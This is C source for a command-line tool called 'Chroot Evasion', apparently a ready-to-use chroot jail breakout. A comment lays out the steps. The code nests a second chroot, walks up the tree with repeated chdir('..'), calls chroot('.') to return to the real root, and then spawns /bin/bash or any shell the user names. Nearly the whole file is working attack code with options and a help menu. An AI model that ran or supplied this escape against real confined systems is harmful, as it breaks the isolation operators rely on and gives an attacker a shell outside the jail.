/*
    - Inside the  **chroot** environment create a new directory that will receive the new chroot env.
    - Change the root directory of this process to the second **chroot** environment as that created folder.
    - Change the **current working directory** to a dir relatively outside the first container.
    - Change the root directory of the process to the current working directory, the **real** root directory, using chroot(".").
    - Spawn the shell.
*/

#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void help() {
    printf("\n"
"    COMMAND   DESCRIPTION\n"
"    -------   -----------\n"
"         -d   New chroot directory (Default: chroot-tmp)\n"
"         -b   Number of times to back the directory\n"
"         -c   Command (Default: /bin/bash)"
"\n");
}

int elevate(int x, int y) {
    for (int i = 0; i < y; i++) {
        x *= 10;
    }
    return x;
}

int charToInt(char* chars) {
    if (chars == NULL) {
        return 5;
    }

    int sum = 0;
    int len = strlen(chars);
    for (int x = 0; x < len; x++) {
        int n = chars[len - (x + 1)] - '0';
        sum = sum + elevate(n, x);
    }
    return sum;
}


int main(int argc, char *argv[]) {
    char *cdir = "chroot-tmp";
    char *shell = "/bin/bash";
    int cdBack = 5;
    struct stat statBuff;

    printf("#### Chroot Evasion ####\ntype `-h` for help menu.\n");

    for (int i = 0; i< argc; i++) {
        if (strcmp(argv[i],"-d") == 0) {
            cdir = argv[i+1];
        } else if (strcmp(argv[i],"-b") == 0) {
            cdBack = charToInt(argv[i+1]);
        } else if (strcmp(argv[i],"-h") == 0) {
            help();
            return 0;
        } else if (strcmp(argv[i],"-c") == 0) {
            shell = argv[i+1];
        }
    }


    /*
    Creating a directory to be the second root environment.
    */
    if(stat(cdir,&statBuff) < 0) {
        printf("[!] %s does not exist!\n",cdir);
        if(mkdir(cdir,0755) < 0) {
            printf("[!] fail to create %s.\n",cdir);
            exit(1);
        } else {
            printf("[+] %s has been created.\n",cdir);
        }
    } else {
        printf("[+] %s has been found.\n",cdir);
    }

    /*
    Chroot the new directory.
    */
    if (chroot(cdir) < 0) {
        printf("[!] Error while creating new chroot env.");
        exit(1);
    }

    /*
    Change the current working dir to outside the corrent working chroot env.
    */
    for (int i = 0; i < cdBack; i++)
        chdir("..");

    /*
    Do a chroot to the current working directory
    */
    chroot(".");
    printf("[+] Spawning %s\n",shell);
    system(shell);
    return 0;
}